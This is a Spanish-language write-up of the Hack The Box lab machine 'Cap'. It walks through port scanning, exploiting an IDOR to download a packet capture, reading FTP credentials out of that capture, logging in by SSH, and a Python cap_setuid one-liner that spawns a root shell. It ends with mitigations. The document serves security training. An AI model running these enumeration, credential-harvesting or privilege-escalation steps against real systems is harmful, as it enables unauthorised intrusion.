# Hack The Box - Cap Writeup

| Campo | Detalle |
|---|---|
| **OS** | Linux (Ubuntu 20.04) |
| **Dificultad** | Easy |
| **IP Víctima** | `10.129.77.10` |
| **Vector Inicial** | IDOR (Insecure Direct Object Reference) & Captura PCAP en FTP |
| **Escalación** | Abuso de Linux Capabilities (`cap_setuid` en Python 3.8) |

---

## Resumen Ejecutivo
**Cap** es una máquina Linux de dificultad fácil que demuestra los riesgos asociados a la falta de control de acceso en aplicaciones web (IDOR), la transmisión de credenciales en texto plano a través de protocolos no seguros (FTP) y la mala configuración de capacidades del sistema (*Linux Capabilities*) para la elevación de privilegios a `root`.

---

## 1. Reconocimiento y Escaneo

### Escaneo de Puertos con Nmap
Se realizó un escaneo completo de puertos TCP con `nmap` para identificar servicios activos en el objetivo:

```bash
sudo nmap -sV -Pn -p- 10.129.77.10 -T5
```

**Puertos abiertos identificados:**
* **21/tcp** - `FTP` (`vsftpd 3.0.3`)
* **22/tcp** - `SSH` (`OpenSSH 8.2p1 Ubuntu`)
* **80/tcp** - `HTTP` (`Gunicorn / Security Dashboard`)

---

## 2. Acceso Inicial (IDOR & Análisis de Tráfico PCAP)

### Fuzzing Web y Descubrimiento de IDOR
Al acceder a la aplicación web (`Security Dashboard`), el sistema inicia sesión automáticamente como el usuario `Nathan`. Al utilizar la función de captura de paquetes, la aplicación redirige a una URL estructurada por ID: `http://10.129.77.10/data/1`.

Se realizó un análisis de enumeración mediante `ffuf` para comprobar si era posible acceder a capturas creadas por otros usuarios:

```bash
ffuf -u [http://10.129.77.10/data/FUZZ](http://10.129.77.10/data/FUZZ) -w <(seq 0 20)
```

Se identificó una vulnerabilidad de **Referencia Directa Insegura a Objetos (IDOR)** al obtener respuesta `200 OK` en la ruta `/data/0`.

### Inspección del Archivo PCAP con Wireshark
Se descargó la captura de red en formato `.pcap` desde `/data/0` y se abrió en Wireshark. Al filtrar por el protocolo FTP:

```text
ftp.request.command == "PASS"
```

Se inspeccionó la trama TCP (*Follow TCP Stream*) revelando la transmisión de credenciales en texto plano durante una autenticación previa:

* **Usuario:** `nathan`
* **Contraseña:** `Buck3tH4TF0RM3!`

### Obtención de la Shell (User Flag)
Utilizando las credenciales extraídas del tráfico FTP, se estableció una sesión remota vía **SSH**:

```bash
ssh nathan@10.129.77.10
```

Se leyó exitosamente la primera bandera en `/home/nathan/user.txt`.

---

## 3. Escalación de Privilegios (`nathan` -> `root`)

### Enumeración de Linux Capabilities
En el sistema víctima se procedió a buscar binarios con capacidades especiales (*Linux Capabilities*) asignadas que pudieran permitir evasión de seguridad:

```bash
getcap -r / 2>/dev/null
```

**Resultado relevante:**
```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

El binario `/usr/bin/python3.8` tiene asignada la capacidad **`cap_setuid`**, lo que permite cambiar el ID de usuario del proceso arbitrariamente a nivel de kernel sin requerir permisos de `sudo`.

### Inyección de Código Python para Root
Aprovechando la capacidad `cap_setuid`, se ejecutó una instrucción de Python para cambiar el UID a `0` (`root`) y generar un subproceso interactivo de Bash:

```bash
/usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

Al verificar la identidad con `whoami`, se confirmó el acceso como **`root`**, permitiendo la lectura de la bandera final en `/root/root.txt`.

---

## Mitigaciones Recomendadas
1. **Control de Acceso en Aplicación Web:** Implementar validación de sesión y autorización por rol antes de permitir la descarga de capturas en la ruta `/data/<ID>`, previniendo ataques IDOR.
2. **Cifrado de Comunicaciones:** Migrar el servicio FTP no seguro a **SFTP** o **FTPS** para garantizar el cifrado en tránsito de credenciales.
3. **Principio de Menor Privilegio:** Retirar la capacidad `cap_setuid` del intérprete de Python (`setcap -r /usr/bin/python3.8`) para evitar la elevación de privilegios local.
